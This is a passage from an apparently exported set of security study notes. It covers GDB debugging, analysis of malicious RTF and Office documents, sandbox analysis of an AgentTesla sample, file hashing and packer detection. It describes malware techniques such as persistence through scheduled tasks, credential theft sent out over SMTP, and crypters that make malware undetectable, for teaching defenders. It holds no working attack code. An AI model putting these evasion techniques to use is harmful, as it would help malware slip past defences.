opened with the “gdb” command. The gdb tool can be used without any plugins as it is here.\nPEDA (Python Exploit Development Assistance) Plugin Installation\nThere are some specific plugins to use the gdb tool with a more understandable user interface. One of them is the PEDA (Python Exploit Development Assistance) plugin. This plugin provides a more colorful and more understandable interface to the user during debugging. The PEDA plugin can be downloaded from:\nPEDA: github.com/longld/peda \nNote: PEDA gdb plugin has already been installed on the Linux machine given in the training.\nThe PEDA plugin installation steps are as in the image below:\n\nLet’s execute the installation commands above.\nCommand: `git clone github.com/longld/peda.git ~/peda\n\nAs seen in the image above, the PEDA plugin has been successfully downloaded.\nCommand: `echo “source ~/peda/peda.py” &gt;&gt; ~/.gdbinit\n\nAs seen in the image above, the command that provides the necessary settings to open the gdb tool with the PEDA plugin has been successfully applied.\nLet’s open the gdb tool and check see if the PEDA plugin is installed properly:\n\nAs we can see it in the screenshot above, the PEDA plugin was successfully installed and the gdb tool was opened with the PEDA plugin.\nIntroduction to Debugging with GDB\nIf the “-q” parameter is used while opening the gdb tool, the banner information is not printed on the command line:\n\nSince the gdb tool is a tool that works on the command line, all operations are executed through the gdb specific commands. In order to see all the commands of the gdb tool, the following command can be applied:\nCommand: `help all\n\nNote: Since the output of the command applied in the above image is very long, only the first part is displayed.\nBasic GDB Commands\nBelow are the basic commands that we must know in order to use the gdb tool:\nNote: We will use the executable file named “helloworld” that we also used in the previous parts of the training to apply the commands here.\nFile Command\nAfter opening the gdb tool, the file to be debugged is given to the program with the below file command:\nCommand: `file helloworld\n\nInfo Command\nAfter the file is given to gdb with the file command, it should be determined where the program flow will be stopped. Generally, executable files written in C programming language are started to be debugged from the “main” function:\nThe “info” command is that the one that provides information in accordance with the given parameter. For example, let’s see the functions in the executable file with this command:\nCommand: `info functions\n\nBreak (or b) Command\nThe points where the program flow will be stopped on gdb are called “breakpoints”. The command used to set a breakpoint is the “break” or “b” command for short. The break command can be given an address or a function name as a parameter. Let’s put a breakpoint in the “main” function seen in the output of the previous command:\nCommand: `break main\n\nAs it can be seen in the screenshot above, a breakpoint has been placed in the main function successfully.\n\nThe “info breakpoints” command can display all the set breakpoints as you can see in the image above.\nRun Command\nThe gdb commands so far are the commands applied before the executable file named “helloworld” is run. The program is executable after the breakpoint is set.\nThe “run” command is to “run” the executable. Let’s start the debugging process by executing the command:\n\nThe see the main screen during the debugging process on gdb on the image above. There are 3 sections on this screen:\n\nRegisters\nCode\nStack\n\n“Registers” is the field that displays the current values of the registers after each instruction execution.\n“Code” is the field where the executed instructions in the program flow are located.\n“Stack” is the field where the elements in the stack data structure are displayed.\nNexti(ni) and Stepi(si) Commands\n“nexti(ni)” and “stepi(si)” are vitally important commands to be able to execute each instruction in the program flow. A single instruction is executed with the “nexti(ni)” command and changes are applied to the relevant register or data fields. With this command will not enable us to get into the functions called with the “call” instruction. If the next instruction to be executed is “call” and it is needed to get into the called function, the “stepi(si)” command should be executed.\nFor example, in the previous image, we saw that the “call” instruction will be executed in the program flow. Let’s go inside the function called with the “si” command:\nNote: Let’s set a breakpoint at the address of the instruction after the “call” instruction in the main function, so that we can go back to where we left off in the main function after entering the function called with “call”:\nCommand: `b *0x565561ad\n\nNote: As you can see in the image above, ” * ” sign is prefixed to the address when setting breakpoints to memory addresses.\nLet’s enter into the function with the “si” command after setting up the breakpoint: \n\nThe above screenshot shows that the function has been entered successfully.\nContinue Command\n“Continue” is the command that should be used to execute the instructions up to the breakpoint, which was previously left in order to return to the main function. It can be abbreviated and use as “c”. Let’s run the instructions up to the breakpoint in the main function with the “continue” command: \nOpen: gdb16.gif\n\nThe above screenshot shows that the program was run successfully until the breakpoint with the “continue” command.\nSet Command\nIn some cases, we may need to interfere with the program flow during debugging. For example, we may need to jump the program flow directly to a different instruction. In this case, we need to change the value of the EIP register using the “set” command. Let’s set the value of the EIP register to a different address using the set command:\nCommand: `set $eip=0x565561bb\nNote: When assigning values to registers, a ”$” sign must be prefixed the register name in the command.\n\nThe above screenshot shows that the value of the EIP register has been changed successfully and the program flow has been interfered with.\nNote: The “context” command used in the screenshot above is used to show the current information on the debugging screen.\nQuit Command\n“Quit” is the command to close the gdb tool.\nNote: The GDB tool can be used online at at its own website below.\nOnline GDB: www.onlinegdb.com/"},"Malware-Analysis/How-to-Analyze-Malicious-RTF-Files":{"slug":"Malware-Analysis/How-to-Analyze-Malicious-RTF-Files","filePath":"Malware Analysis/How to Analyze Malicious RTF Files.md","title":"How to Analyze Malicious RTF Files","links":[],"tags":[],"content":"Analyzing malicious RTF files by examining their structure, inspecting embedded objects &amp; identifying potential threats.\nRTF (Rich Text Format) files, developed by Microsoft for cross-platform document interchange. Recently it’s utilized by malware authors due to their compatibility across different applications and platforms. These files can contain embedded objects like macros or scripts, exploited to execute malicious code upon opening.\nHow does it work?\nMalware authors often employ social engineering tactics, disguising RTF files as legitimate documents, to deceive users into opening them. Additionally, RTF files can evade detection by antivirus software through obfuscation techniques or zero-day exploits, providing an effective means for distributing malware payloads while minimizing the risk of detection and analysis.\nFile Details:\nHash : b2b8ef2a3bf64dd5531bd414e7f946c9f040ab2674bc73eb0d4af0d314623174\nMagic : Rich Text Format data, version 1\nFilename: Unknown.rtf / SecuriteInfo.com.Exploit.ShellCode.69.14498.22623.rtf\nFileType: Rich Text Format (.rtf)\nSize : 72.10 KB (73827 bytes)\nHow to Analyze the RTF File?\nTo analyze an RTF file effectively, it’s essential to first understand its structure and syntaxes.\nThe RTF (Rich Text Format) file structure usually begins with a header, followed by the document body containing content, formatting instructions, and embedded objects. Formatting elements are defined using control words, denoted by special sequences with a backslash (). Special characters and escapes represent characters with special meaning. Embedded objects like images or macros may be included. The file concludes with an end-of-file marker indicating the document’s end.\n\nControl words in RTF files are specific sequences of characters, typically represented by a backslash (), that function as commands to define formatting, document properties, or other instructions. These control words play a crucial role in specifying various elements within the document, such as font styles, text alignment, paragraph formatting, and more. \nFor instance, “\\b” signifies bold text, “\\i” denotes italic text, and “\\par” indicates a paragraph break. Essentially, control words enable the encoding of the document’s structure and formatting within the plain text content of the RTF file, facilitating consistent rendering across different software applications.\n\nLet’s analyze the sample, going through each step one by one.\nHeader of the RTF File:\n\nManual Extraction of RTF Components:\nStep 1: Open the RTF sample using Microsoft Word.\nStep 2: After opening it, navigate to the “Save As” option and save a copy of the document in another format, such as Word 97-2003.\nStep 3: Once the copy is saved, extract the sample and generate a dump file.\nStep 4: Unzip the dump file to reveal the components of the RTF.\nStep 5: Proceed to analyse each of these components individually.\nStep 6: Notably, within the Word document, you’ll find the embedded Equation3 Editor.\nExtracted Dump file:\n\nObtained Embedded Equation3 Editor:\n\nDynamic Technique:\nAfter opening the RTF file, the embedded function links with the object, exploiting the equation editor, and establishes a connection with their malicious command and control (CNC) server. This connection facilitates the download of the payload file, enabling malicious activities to be executed on the system.\n\nObtained URL:\n\nAV Vendor Sandbox Results:\nAnalyzing sandbox results enables us to know whether the URL is associated with malware, phishing attempts, or other malicious activities. Here the obtained URL is marked as 100% malware.\n"},"Malware-Analysis/Malicious-Doc-Analysis":{"slug":"Malware-Analysis/Malicious-Doc-Analysis","filePath":"Malware Analysis/Malicious Doc Analysis.md","title":"Malicious Doc Analysis","links":["SOC/SOC-Analyst-Notes/Security-Solutions"],"tags":[],"content":"Basic Analysis\nHashes\nFirst we check its md5 or sha256 hash using following command and run it through virustotal:\nmd5sum baddoc.doc\n \nsha256sum baddoc.doc\nMetadata\nWe can look for document’s metadata to get more info on the document using following command:\nexiftool baddoc.doc\nWe can also use olemeta for metadata:\nolemeta baddoc.doc\nStrings\nWe can extract strings from the document which can show us valuable insights such as IP Addresses, Paths, domains, Commands,etc.\nstrings -n 5 baddoc.doc\nHere, -n is used to set length of string to extract (5 or greater in this case).\nXorsearch\nXorsearch command is used to search for encrypted strings in the document.\nxorsearch baddoc.doc http\nThe above command will search for any encrypted strings in the file baddoc.doc which start with “http”.\nxorsearch -p baddoc.doc\nThe above command will search the file baddoc.doc and find any encrypted embedded executables.\nOletools\nDownload and Install:\nInstallation Guide\nThe recommended way to download and install/update the latest stable release of oletools is to use pip:\n\nOn Linux/Mac: sudo -H pip install -U oletools[full]\nOn Windows: pip install -U oletools[full]\n\nThis should automatically create command-line scripts to run each tool from any directory: olevba, mraptor, rtfobj, etc.\nTools:\nTools to analyze malicious documents\n\noleid: to analyze OLE files to detect specific characteristics usually found in malicious files.\nolevba: to extract and analyze VBA Macro source code from MS Office documents (OLE and OpenXML).\nMacroRaptor: to detect malicious VBA Macros\nmsodde: to detect and extract DDE/DDEAUTO links from MS Office documents, RTF and CSV\npyxswf: to detect, extract and analyze Flash objects (SWF) that may be embedded in files such as MS Office documents (e.g. Word, Excel) and RTF, which is especially useful for malware analysis.\noleobj: to extract embedded objects from OLE files.\nrtfobj: to extract embedded objects from RTF files.\n\nTools to analyze the structure of OLE files\n\nolebrowse: A simple GUI to browse OLE files (e.g. MS Word, Excel, Powerpoint documents), to view and extract individual data streams.\nolemeta: to extract all standard properties (metadata) from OLE files.\noletimes: to extract creation and modification timestamps of all streams and storages.\noledir: to display all the directory entries of an OLE file, including free and orphaned entries.\nolemap: to display a map of all the sectors in an OLE file.\n\nDeobfuscation\nWe will be using Oletools for deobfuscating the vba code. The steps for deobfuscation:\n1. Get the vba code\nWe can use Olevba for extracting the code as follows:\nolevba baddoc.doc &gt; baddoc.vba\n2. Deobfuscate the code\nWe will again use Olevba command but with some extra parameters for deobfuscation.\nolevba --deobf --reveal baddoc.vba &gt; baddoc_deobf.vba\nThis command will write the obfuscated code first and then the deobfuscated version below it.\n3. Manual deobfuscation\nOletools can only do so much. Manual deobfuscation will probably be necessary for encrypted strings and stuff.\n4. Analysis\nAfter the deobfuscation, the olevba generated table will contain much more info about the macro. Reanalysis can reveal a lot of info.\nVMonkey\nVMonkey is a terminal based linux-tool used to run the vba script safely and do some dynamic analysis. It displays all the dropped files, executed commands and stuff.\nTo run vmonkey will need the vba script (make sure to remove any boilerplate generated by the olevba tool.\nvmonkey baddoc.vba\nTo see just IOCs:\nvmonkey --iocs baddoc.vba\nNext: Security Solutions"},"Malware-Analysis/Malware-Analysis-Tools":{"slug":"Malware-Analysis/Malware-Analysis-Tools","filePath":"Malware Analysis/Malware Analysis Tools.md","title":"Malware Analysis Tools","links":[],"tags":[],"content":"Tools &amp; Software\nVirtualization Software\nWe do not want to conduct dynamic analysis on our own system as we need to run the malware to be able to examine its activities. For this reason, we should make use of Virtualization Software that helps us work on some virtual systems.\nThanks to these software, you can use a different operating system on your host operating system. If they are configured properly, you can perform your analysis safely, as malicious software cannot escape from this virtual operating system. It is useful to make a small note here on these virtualization software. Since these virtualization environments are essentially software, various vulnerabilities that allow malwares to escape out of these virtual environments and allow code executions on the host operating system may occur on these environments. For this reason, It is crucial to keep your virtualization software up-to-date.\nSome of the frequently used virtualization software are as follows;\n\nVMware Workstation\nVMware Fusion\nOracle Virtualbox\n\nAn ideal isolated dynamic analysis environment consists of a completely separate physical device and a separate network. However, setting up this complex environment is both very costly and it is not necessary to begin with.\nUtility Softwares\nAfter installing your own virtual operating system, you need to install software that will be useful in dynamic analysis. For example, we will not be able to perform dynamic analysis of office files with file extensions such as docx, xlsx without installing Microsoft Office or similar software on the system.\n\nMicrosoft Office\nAdobe Reader\nBrowser (Chrome, Firefox etc.)\nWinRAR\nText Editors (Notepad++, Sublime Text etc.)\n\nThe attackers are very familiar with the dynamic analysis method. Therefore they check whether frequently used software is installed or not on the target system to be able determine if the malware is running on a virtual operating system before performing malicious activities on the devices they compromised.\nDebuggers\nDebuggers are software that are generally used by programmers to test the codes and catch the errors. Debuggers help to see the instructions of a process and change the flow of the program\nMalware analysts frequently make use of debuggers to learn the working structure of the malware and disable some prevention mechanisms by making changes to the malware codes.\nFor instance, you want to analyze a malware that does not work when the device name is not “John”. With the help of the Debugger, you can disable this control by making changes to the codes in which this control is made, and ensure that the malware continues to run.\nSome debuggers that are frequently preferred by malware analysts are as follows.\n\nOllydbg\nX64dbg\nWindbg\nRadare2\n\nNetwork Monitoring Tools\nInformation such as the network connections established by the malware, the addresses it communicates with and how it communicates with those should be reported as a result of the malware analysis.\nWe need some software to detect the network activities of the malware. Some of them are as follows.\n\nWireshark\nFiddler\nBurp Suite\n\nProcess Monitoring Tools\nA new process is created for the program we run for malware analysis. In order to monitor these processes, we should use process monitoring tools.\nWindows already comes with a process monitoring tool called “Task Manager”. However, other process monitoring tools are more useful in terms of usage and features for malware analysis.\nYou can install the following process monitoring tools in the virtual operating system we will create for dynamic malware analysis.\n\nProcess Hacker\nProcess Explorer (SysInternals)\nProcmon (SysInternals)\n\nFile Activity Monitoring Tools\nFile activities are one of the first activities that should be followed in dynamic analysis. Malware can read files to collect information from the operating system, write other components of the malware to the file system, and move itself to the startup folder to ensure the persistence. Malware can be involved in various activities in the file system for these and other reasons. We should detect and indicate these activities in the malware analysis report.\nYou can use the following tools to see file activities.\n\nSysmon\n\nOther Tools\n\nSysInternal Tools\nCFF Explorer\nPEView\nTriDNet\nBinText\nPEiD\nRegshot\nHashMyFiles\n"},"Malware-Analysis/Malware-Analysis-Using-Anyrun":{"slug":"Malware-Analysis/Malware-Analysis-Using-Anyrun","filePath":"Malware Analysis/Malware Analysis Using Anyrun.md","title":"Malware Analysis Using Anyrun","links":[],"tags":[],"content":"Dynamic Analysis Using AnyRun\nYou can take advantage of sandbox services / products to quickly analyze malware.\nAnyRun is an interactive sandbox that you can use when you want to analyze malware quickly.\nAnyRun has options for paid or free use. If you want to take advantage of it for free, all your analysis is visible to others, therefore we do not recommend that you upload files that may contain personal data to AnyRun. In addition, the free plan has restrictions such as usage time.\nHow can we use AnyRun for our malware analysis, what kind of outputs we can get, let’s examine it together.\nLet’s download the malware with hash 80b51e872031a2befeb9a0a13e6fc480 to analyze via AbuseCH (Click here to download).\nWe have to click on the ”+” (New Task) button on the left menu to upload the malware we downloaded.\n\nLet’s upload the file we want to analyze on the screen that opens with the help of the “Choose a file” button. After the file is uploaded, we can determine the parameters such as which operating system we want to run the malware and 32/64 bit of operating system to use. After determining these, we open our sandbox with the help of the “Run” button at the bottom right of the screen that opens.\nWhen our machine is turned on, we run the malicious software we uploaded to see it’s activities.\nSome malware stays dormant for a certain period of time before performing its malicious activities, making analysis difficult. Let’s allow time for the malware to perform its activities, during this time, let’s examine the AnyRun interface together.\n\n\nFrom this area, you can use the operating system interactively.\nHere is a list of processes in this section. From here, you can easily see which childprocesses the malware you run has.\nIn this area there is network and files events.\nThis section contains details of the process.\n\nLet’s examine these outputs.\nFirst, let’s examine the process events of the malware in the section marked “2” in the image above.\n\nThe malware we run manually seems to have created 2 child processes. One of them is schtasks.exe, which is run to ensure persistence on the system by creating a schedule task and the other is the process specified as “AgentTesla” malware by AnyRun.\nWhen we click on Processes, information about this process is displayed in panel number 4. Let’s examine the details of all processes respectively.\nSince the process named “WinRAR.exe” is created when we extract the malware from the archive file to run it, we will not examine this process.\nWhen we click on the process with ID 2680, information about this process is listed on panel number 4.\n\nWith the “More Info” button on this panel, a page with detailed information about the process is opened. When we want to reach detailed information, we can use this section.\nWhen the process information with 2680 ID is examined, the malware:\n\nUses Task Scheduler,\nWrites a program to the file system which compile time is too old,\nWrites many files to the user directory\n\n\nWhen we examine the process with ID 2616, we see that it is schtasks.exe belonging to Task Scheduler.\nWhen we examine the “Command Line” parameters, we see that it creates a schedule task named “Updates\\neHneiobyhcrJJ”. The configurations for this schedule task are in the file “tmp5383.tmp”.\n\nWhen we examine the schedule task configuration file named tmp5383.tmp, we see that the program named “neHneiobyhcrJJ.exe” will run.\n\nWhen we examine the process with ID 3140:\n\nThis malware is recognized by AnyRun as AgentTesla,\nSteals credentials,\nCreating files in the user directory\n\n\nWhen we examine the network connections made from panel number 3, we see that malware connects to smtp.godforeu.com.\nWith the help of the button on the right of the panel, we can examine the incoming/outgoing data.\n\nWhen the network activities of the malware are examined, we find that malware exfiltrates data with the SMTP protocol.\nIf you want to examine, you can reach the analysis made here (Click here)."},"Malware-Analysis/Malware-Analysis":{"slug":"Malware-Analysis/Malware-Analysis","filePath":"Malware Analysis/Malware Analysis.md","title":"Malware Analysis","links":["Malware-Analysis/Static-Malware-Analysis","Malware-Analysis/Dynamic-Analysis-Steps","Malware-Analysis/Malware-Analysis-Using-Anyrun","Malware-Analysis/Online-Malware-Analysis-Services","Malware-Analysis/Dynamic-Malware-Analysis-Example-1","Malware-Analysis/Dynamic-Malware-Analysis-Example-2","Malware-Analysis/Setting-up-Malware-Analysis-Lab","Malware-Analysis/Malicious-Doc-Analysis","Malware-Analysis/Reverse-Engineering"],"tags":[],"content":"Malware Analysis Methods\n1. Static Malware Analysis\nIt is the approach of analyzing malicious software by reverse engineering methods without running them.\nStatic Malware analysis is explained in detail in Static Malware Analysis note.\n2. Dynamic Malware Analysis\nIt is the approach that examines the behavior of malicious software on the system by running it. We can do it in our own lab or using Anyrun.\n1.Steps for Dynamic Analysis\n2. Malware Analysis Using Anyrun\n3. Online Malware Analysis Services\n4. Examples of Dynamic Analysis\na.  Dynamic Malware Analysis Example 1\nb. Dynamic Malware Analysis Example 2\nMalware Analysis Lab\nWe can’t and shouldn’t run malware in our main system as it would infect it so we need a separate burner system to run and analyze malware. For this, we need a Malware Analysis Lab . Setting up a malware analysis lab is described in Setting up Malware Analysis Lab article.\nAlso Check out:\n1. Malicious Doc Analysis\n2. Reverse Engineering"},"Malware-Analysis/Malware-Hash":{"slug":"Malware-Analysis/Malware-Hash","filePath":"Malware Analysis/Malware Hash.md","title":"Malware Hash","links":[],"tags":[],"content":"What is File Hash?\nA hash is a value generated by a hash algorithm through mathematical calculations applied to a given set of data. Here, the input data for the hash algorithm is the file containing the malware. This specific type of hash is commonly called a “file hash.” It serves as a distinct signature for files.\n\nNote: Hash functions are a broad subject within the field of cryptology. While this course provides an overview of hash functions, it does not delve into the topic extensively. Instead, the focus here is on explaining the hash functions and their use in terms of static malware analysis.\nFinding the Hash of the File with the Tool\nOne of the primary resources in static malware analysis is existing analysis reports, which play a crucial role. The hash value of a file is employed to access these analysis reports. By searching the hash value of a file in well-known signature databases, it is possible to determine if the malware has been previously analyzed and obtain the corresponding analysis results. This approach offers the advantage of avoiding the need to upload the malware file to online sandbox environments. Consequently, if the goal is to prevent the malware file from being publicly published through online sandbox environments, this method ensures confidentiality. However, it is essential to note that if a newly encountered malware lacks preliminary analysis, no analysis reports can be accessed using its hash value.\nThis section of the training demonstrates various methods for calculating the hash value of a malware file.\nThere are several tools used to calculate the hash of a file. For example, below “HashCalc” is used to calculate the hash value of the malware.\n\nWhen the HashCalc tool is launched, it appears as shown in the image above. It is possible to calculate both hash values of files and hash values of texts via the HashCalc tool.  To do so, the appropriate option in the “Data Format” field located in the top-left corner should be chosen.  “File” as the data format option should be selected:\n\nAfter selecting the data format, the malware file is provided to the tool for hash calculation.\n\nAfter selecting the desired hash algorithm for hash calculation using HashCalc as in the above example, the hash values are calculated by clicking the “Calculate” button located at the bottom right of the tool.\n\nAs can be seen in the image above, the hash of the malware has been successfully calculated for various hash functions. While the “HashCalc” tool demonstrated above is quite helpful in calculating the hash of individual files, it may not efficiently handle the computation of hash values for multiple files simultaneously. In such cases, alternative tools like “HashTools” are more suitable for calculating the hash of multiple files.\nThe “HashTools” tool features a graphical user interface that closely resembles the one shown above. When HashTools is initially launched, it will appear as the following:\n\nThe files whose hash will be calculated are added to the tool with the help of the buttons in the upper left part of the window seen in the image above. After the files are added, the hash calculation can be performed according to the desired hash algorithm with the help of the buttons at the bottom of the window.\n\nAs seen in the image above, the hash values of the files have been successfully calculated in accordance with the MD5 hash algorithm. With this tool, the hash of multiple files can be calculated rapidly. However, calculations are allowed for only one hash algorithm at a time. It is recommended to consider this when deciding which hash tool to use.\nThe following tools running on Windows can also be used to find the file hash:\nHashMyFiles: www.nirsoft.net/utils/hash_my_files.html \nQuickHash: www.quickhash-gui.org/  \nObtaining The Hash of The File Through Powershell\nIn certain scenarios, it may be necessary to calculate file hashes via the command line. In Windows, file hashes can be easily calculated using Powershell. For example, let’s calculate the hash of malware using Powershell:\nCommand: ```\nGet-FileHash .\\eabfb9aaa4d1adec7c124bd0bda7a81c53249f2bac5743bedf67adf705d0d1f4.exe | Format-List\n\nAs shown in the image above, the file hash can be calculated using the “Get-FileHash” command in PowerShell. The command can work with just a single parameter, which is the file’s name. By default, the calculation is performed using the SHA256 hash function. If a different hash function is needed, the “-Algorithm” parameter should be added. As an instance of this, let’s calculate the hash of the same malware file using the MD5 hash function.\nCommand:\nGet-FileHash .\\eabfb9aaa4d1adec7c124bd0bda7a81c53249f2bac5743bedf67adf705d0d1f4.exe -Algorithm MD5 | Format-List\n\nAs in the image above, the hash calculation for the MD5 hash function has been performed successfully.\nNote: The PowerShell command mentioned above, “Format-List,” enables the output to be presented in a list format. When this command is omitted, the output will be displayed on a single line.\nInformation Gathering with File Hash\nThe previous section demonstrated the process of calculating the hash of a malware file. In this part of the training, the various resources that can be utilized to gather information about malware are introduced using the hash value. The following list of resources can be used to collect information about the malware using File Hash:\n\nVirusTotal: www.virustotal.com/gui/home/search \nAnyRun: app.any.run/submissions/ \nJoe Sandbox: www.joesandbox.com/#windows \nHybrid Analysis: www.hybrid-analysis.com/ \nMetaDefender: metadefender.opswat.com/ \nEchoTrail: www.echotrail.io/ \nIntezer: analyze.intezer.com/scan\nFileScan.IO: www.filescan.io/scan\nInQuest Labs: labs.inquest.net/dfi/search/hash/sha256 \nManalyzer: manalyzer.org/ \nSandboxPikkerEE: sandbox.pikker.ee/ \nYomi: yomi.yoroi.company/upload \n\nVirusTotal\nVirusTotal is one of the prominent sources for searching hashes of malware and accessing available analysis reports. The image of the web page is as follows:\n\nThe current analysis report can be accessed by searching the hash in the search section seen in the image above. For example, the analysis report of a malware is as follows:\n\nThe image above displays a section of the analysis report. VirusTotal is a valuable resource that provides extensive information about malware."},"Malware-Analysis/Memory-Layout":{"slug":"Malware-Analysis/Memory-Layout","filePath":"Malware Analysis/Memory Layout.md","title":"Memory Layout","links":[],"tags":[],"content":"What is Memory?\nMemory is one of the most basic hardware units used for running the programs and the operation of the computer. When the computer is started, the operating system which is actually a software, the system software is loaded into the memory. The operating system is much larger than other software. Memory is a storage unit that is temporarily used during the execution of programs. Today, programs use memory for data storage because they use too much program data in size to be kept in processor variables. Memory contains some data structures that have their own special functions.\nNote: For detailed study in memory forensics, please refer to the following link:\nMemory Forensics: app.letsdefend.io/training/lessons/memory-forensics \nWhat is Stack and Heap?\nA “Stack” is a section of memory that is allocated when a program is run. Stack contains local variables and function arguments of the program.\n“Heap” is a partition in memory that is reserved when a program is run. There are dynamic variables created for the program in the heap. There are no static variables in the heap as it is in the stack. Compared to the stack, heap is larger and has more freedom inside the operating system.\nHow Stack and Heap Work?\nStack is an area that expands from high memory addresses to low memory addresses. The heap is the exact opposite and expands from low memory addresses to high memory addresses.\n\nStack Operations\nStack applies a certain method when importing or extracting data from its data structure. This method is called “Last In First Out (LIFO)”. In this method, the data that enters the data structure last is removed from the stack in the first place. There are two basic functions in the Stack data structure. These are the “Push” and “Pop” functions.\nPush\n“Push” is the function that provides data intake to the stack. The below image shows how a few data are placed on the stack with the push function respectively, and the working principle of the stack:  \n\nThe above image simply shows how the data is placed into the stack. Access to the data in the stack is provided by memory addresses and the ESP register. Each data in the stack has a separate memory address.\nPop\n“Pop” is a function that helps extract data from the stack. The below image shows the working principle of the stack as well as how some data that were previously placed in the stack in accordance with its working logic, are removed from the stack with the pop function:  \n\nWhat is Endianness?\nA processor can access the data in memory in different ways in accordance with the memory structure. This is called endianness and has 2 methods:\n\nBig Endian\nLittle Endian\n\nBig Endian is matching the byte at the smallest address in the memory with the byte (most significant byte) at the largest address in the register when accessing the memory.\n\nLittle Endian is matching the byte at the smallest address in the memory with the byte (least significant byte) at the smallest address in the register when accessing the memory.\n\nTf is endian?\nWatch this:\n"},"Malware-Analysis/Online-Malware-Analysis-Services":{"slug":"Malware-Analysis/Online-Malware-Analysis-Services","filePath":"Malware Analysis/Online Malware Analysis Services.md","title":"Online Malware Analysis Services","links":[],"tags":[],"content":"\nAnlyz\nAny.run\nComodo Valkyrie\nCuckoo\nHybrid Analysis\nIntezer Analyze\nSecondWrite Malware Deepview\nJevereg\nIObit Cloud\nBinaryGuard\nBitBlaze\nSandDroid\nJoe Sandbox\nAMAaaS\nIRIS-H\nGatewatcher Intelligence\nHatching Triage \nInQuest Labs\nManalyzer\nSandBlast Analysis\nSNDBOX\nfirmware\nopswat\nvirusade\nvirustotal\nmalware config\nmalware hunter team\nvirscan \njotti\n"},"Malware-Analysis/Packers--and--Unpackers":{"slug":"Malware-Analysis/Packers--and--Unpackers","filePath":"Malware Analysis/Packers & Unpackers.md","title":"Packers & Unpackers","links":[],"tags":[],"content":"What is Packing and Unpacking?\n“Packing” refers to the procedure of transforming an executable file into a different file format using a special algorithm for specific objectives. Conversely, “unpacking” denotes the process of reverting the packed file to its original form, essentially reversing the packing procedure.\nDetails about Packing/Unpacking operations are explained in the following topics.\n\nThe image displayed above shows the file structure of a Windows executable file both before and after the process of packing.\nWhat Does Packing Provide?\nPacking uses an algorithm that causes structural changes to the executable file. This algorithm offers several significant advantages, including:\n\n\nMakes the executable file smaller in size.\n\n\nPrevents obtaining information about the file by static analysis using reverse engineering techniques.\n\n\nPrevents or makes detection by security products difficult.\n\n\nHow Does Unpacking Work?\nWhen an executable file is packed, it undergoes additional operations compared to an unpacked executable. These operations enable the packed file to execute successfully on the system. The following image illustrates this process step by step:\n\nThe process in the image above is briefly explained as follows:\n\n\nThe specific section highlighted in this stage is referred to as the entrypoint. It shows the initial step to be executed when the packed executable file is run. Due to the file being packed, the entrypoint points to the section containing the unpacker mechanism.\n\n\nAt this stage, unpacking is applied to the “Packed Executable” section using the unpacker.\n\n\nAt this stage, the “Original Unpacked Executable” resulting from the unpacking process in the previous stage is written to the empty section.\n\n\nDuring this stage, control of the program flow transitions from the unpacker to the original executable.\n\n\nFinally, the executable that has been successfully unpacked is executed.\n\n\nPackers\nA packer refers to a tool or algorithm utilized to execute the packing process. Nowadays, packers are primarily employed for secure source code. They are used by both software vendors and attackers. The user base of packers can vary depending on the type employed.\nThere are commercial packers as well as custom packers written by the attackers themselves. Some of these are open source. Some packers are shown in the image below:\n\nTypes of Packers\nCategorizing packers into specific types can be challenging because a single packer may serve multiple purposes, making clear classification difficult. However, the following classification is provided as it is considered to be the most suitable one:\nNote: It should be noted that a different classification may be included in another source. \nPackers may be divided into 3 groups: \n\n\nCompressing Packers\n\n\nEncrypting Packers(Crypters)\n\n\nProtecting Packers(Protectors)\n\n\nCompressing Packers\n “Compressing packers” are packers that reduce the size of an executable file.  In the past, these packers were commonly used to address limitations posed by slow internet speeds and limited storage capacity. However, currently, technology has reached a certain maturity and the size of executable files is no longer a significant concern.\nEncrypting Packers(Crypters)\nEncrypting packers (Crypters) are designed to encrypt the executable file, making it exceedingly challenging to extract information using static malware analysis techniques. Additionally, encrypting packers pose difficulties for security solutions in detecting malware. Malware developers frequently employ this type of packer to make their malware fully undetectable (FUD).\nProtecting Packers(Protectors)\nProtecting packers are a type of packer used by software developer vendors. With these packers, software vendors aim to prevent the source code of executable files of their products from being intercepted by reverse engineering techniques. These packers usually use both compressing algorithms and encryption algorithms.\nNote: Since packers are not strictly separated by their functions, an attacker can use a packer with both compressing and encryption capabilities as a packer to make the malware fully-undetectable (FUD). SOC analysts are recommended to take this into account when performing static malware analysis.\nHow to Identify Packers Automatically and Manually?\nWhen analyzing a malware statically, it is of great advantage to know whether packing operations have been applied or not. Because static analysis of a packed malware before it is unpacked provides almost no useful information about the executable file. Therefore, packed malware should be unpacked first. To achieve this, it is crucial to determine the packing algorithm employed. Both automatic and manual methods can be employed to detect the specific packing algorithm used. Automatic methods involve utilizing packer detection tools, while manual methods entail examining the file with the assistance of analysis tools. The automatic method is generally easier to apply and saves time. However, packer detection tools may not be effective in static analysis when dealing with malware that uses custom packers. In such cases, it becomes necessary to employ the manual method to understand the packing algorithm, which can be time-consuming and less desirable for SOC analysts.\nIn the headings below, automatic and manual methods are applied on the same malware and the packing algorithm used is determined.\nDetecting Packers with DIE(Detect It Easy)\nNumerous tools are available for determining the packer used in a malware sample. This tutorial utilizes the “DIE (Detect It Easy)” tool for packer detection. You can access the tool from the following address:\nDIE(Detect It Easy): github.com/horsicq/DIE-engine/releases \nOne packer detection tool may not detect every packer. Therefore, it is recommended to use more than one packer detection tool. Some packer detection tools are as follows:\n\nDIE(Detect It Easy)\nPEStudio\nCFF Explorer\nPEiD\nExeinfoPE\n\nFor instance, let’s find out which packer a malware is packed using the “DIE (Detect It Easy)” tool:\n\nUpon launching the DIE tool,  a window like the one above appears. The malware file is given to the program with the help of the button on the top right.\n\nAs demonstrated in the image above, the tool successfully detected the packer used to package the malware. Similar tools, including this one, employ signatures to identify specific packers during the detection process.\nNote: It would be more useful to perform the analysis considering that a packer may have more than one different signature. Packers may have varying signatures depending on their version.\nThere is a list of signatures of some packers in the address below.\nPacker Signature List: github.com/sooshie/packerid/blob/master/userdb.txt \nTo further illustrate the process, we can open the malware file in a hex editor called “HxD” and utilize its search feature to find the signature associated with the packer. \nSignature(Hex): 60 E8 03 00 00 00 E9 EB 04 5D 45 55 C3 E8 01 00 00 00 EB 5D BB ED FF FF FF 03 DD 81 EB\n\n\nAs seen in the image above, the signature we are looking for is located at 4201 offset.\nDetecting Packers Manually\nIn the previous topics, it is determined which packer packs the malware automatically and with the help of a tool. Under this title, a method that can be used to detect the packer manually is explained. In this method, we focus on the “Section Name” of the executable file. The table below presents the section names associated with several packers:\n\nIt is possible to find the packer by searching section names with static malware analysis tools. The following tools are available for this:\n\nPEview\nPE-bear\nStud_PE\n\nTo further investigate the malware that was identified using the automatic packer detection method mentioned earlier, we can analyze 